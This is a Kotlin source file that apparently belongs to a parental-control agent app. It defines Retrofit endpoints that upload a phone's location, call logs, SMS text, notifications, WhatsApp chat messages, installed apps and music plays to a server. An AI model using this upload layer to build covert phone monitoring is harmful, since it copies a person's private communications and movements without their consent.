package com.parentalcontrol.agent.network

import retrofit2.Response
import retrofit2.http.Body
import retrofit2.http.POST

// ---------- Payloads ----------

data class LocationPayload(
    val latitude: Double,
    val longitude: Double,
    val accuracy: Float,
    val timestamp: Long
)

data class CallLogEntry(
    val number: String,
    val type: Int,       // 1=Incoming, 2=Outgoing, 3=Missed
    val date: Long,
    val duration: Long,
    val name: String
)

data class SmsEntry(
    val address: String,
    val body: String,
    val date: Long,
    val type: Int        // 1=Inbox, 2=Sent
)

data class NotificationPayload(
    val appPackage: String,
    val appName: String,
    val appIcon: String?,   // base64 PNG, nullable
    val sender: String,
    val message: String,
    val timestamp: Long
)

data class WhatsAppChatPayload(
    val chat: String,
    val sender: String,
    val message: String,
    val timestamp: Long
)

data class InstalledAppEntry(
    val packageName: String,
    val appName: String,
    val version: String,
    val installedAt: Long,
    val iconBase64: String?
)

data class MusicPlayPayload(
    val appPackage: String,
    val trackTitle: String,
    val artistName: String,
    val albumName: String?,
    val durationMs: Long?,
    val albumArtBase64: String?,
    val timestamp: Long
)

// ---------- Service ----------

interface ApiService {

    @POST("agent/location")
    suspend fun sendLocation(@Body payload: LocationPayload): Response<Unit>

    @POST("agent/calls")
    suspend fun sendCallLogs(@Body entries: List<CallLogEntry>): Response<Unit>

    @POST("agent/sms")
    suspend fun sendSmsLogs(@Body entries: List<SmsEntry>): Response<Unit>

    @POST("agent/whatsapp")
    suspend fun sendNotification(@Body payload: NotificationPayload): Response<Unit>

    @POST("agent/whatsapp/chat")
    suspend fun sendWhatsAppChat(@Body payload: WhatsAppChatPayload): Response<Unit>

    @POST("agent/apps")
    suspend fun sendInstalledApps(@Body entries: List<InstalledAppEntry>): Response<Unit>

    @POST("agent/music")
    suspend fun sendMusicPlay(@Body payload: MusicPlayPayload): Response<Unit>
}
